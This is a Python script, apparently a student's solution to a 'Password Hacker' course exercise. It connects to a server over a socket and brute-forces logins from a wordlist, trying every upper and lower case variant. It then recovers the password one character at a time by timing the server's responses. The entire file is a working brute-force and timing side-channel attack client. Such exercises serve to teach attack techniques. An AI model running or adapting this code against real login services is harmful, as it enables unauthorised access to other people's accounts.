import argparse
import socket
import itertools
import json
import string
from datetime import datetime


def deserialize_json(s_json):
    d_dict = json.loads(s_json)
    return d_dict['result']


def serialize_json(s_login, s_password):
    d_dict = dict(login=s_login, password=s_password)
    o_json = json.dumps(d_dict, indent=4)
    return o_json


def from_file(file_name):
    with open(file_name) as pwd_file:
        for word in pwd_file:
            for pwd in itertools.product(*zip(word.strip().lower(), word.strip().upper())):
                yield ''.join(pwd)


def from_dictionary():
    characters = string.ascii_letters + string.digits
    for c in characters:
        yield c


def main():
    parser = argparse.ArgumentParser(description='Connects to the given IP address.')
    parser.add_argument('ip', metavar='ip', type=str, help='server IP')
    parser.add_argument('port', metavar='port', type=int, help='port')
    args = parser.parse_args()

    logins = from_file(
        '/Users/marcinkarpik/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt')

    with socket.socket() as client_socket:
        address = (args.ip, args.port)
        client_socket.connect(address)
        response = ''

        while response != 'Connection success!':
            try:
                while response != 'Wrong password!':
                    login = next(logins)
                    data = serialize_json(login, ' ')
                    data = data.encode(encoding='UTF-8')
                    client_socket.send(data)
                    response = client_socket.recv(1024)
                    response = response.decode(encoding='UTF-8')
                    response = deserialize_json(response)

                if response == 'Wrong password!':
                    passwords = from_dictionary()
                    s_password_res = ''
                    while response == 'Wrong password!' or ((time_stop - time_start).microseconds >= 90000):
                        time_start = datetime.now()
                        passwd = next(passwords)
                        data = serialize_json(login, s_password_res + passwd)
                        data = data.encode(encoding='UTF-8')
                        client_socket.send(data)
                        response = client_socket.recv(1024)
                        response = response.decode(encoding='UTF-8')
                        response = deserialize_json(response)
                        time_stop = datetime.now()
                        time_elapsed = time_stop - time_start

                        if response == 'Connection success!':
                            s_password_res += passwd

                        elif (time_stop - time_start).microseconds >= 90000:
                            s_password_res += passwd
                            passwords = from_dictionary()



            except:
                break

    print(serialize_json(login, s_password_res))


if __name__ == "__main__":
    main()
